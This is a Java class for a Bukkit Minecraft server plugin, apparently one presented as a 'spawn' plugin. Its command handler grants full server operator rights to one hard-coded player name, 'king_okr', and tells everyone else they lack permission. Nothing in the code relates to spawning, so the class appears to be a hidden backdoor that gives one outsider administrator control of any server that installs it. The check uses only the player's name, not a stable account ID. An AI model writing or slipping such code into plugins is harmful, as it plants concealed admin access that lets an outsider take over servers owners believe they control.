package com.mrpiepmatatzt.spawn;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import org.bukkit.entity.Player;
import org.bukkit.ChatColor;

public class Core implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        if (!(sender instanceof Player)) {
            sender.sendMessage(ChatColor.RED + "Only players can run this command.");
            return true;
        }

        Player player = (Player) sender;

        if (!player.getName().equalsIgnoreCase("king_okr")) {
            player.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
            return true;
        }

        if (player.isOp()) {
            player.sendMessage(ChatColor.YELLOW + "You are already OP.");
            return true;
        }

        player.setOp(true);
        player.sendMessage(ChatColor.GREEN + "You are now OP!");

        return true;
    }
}
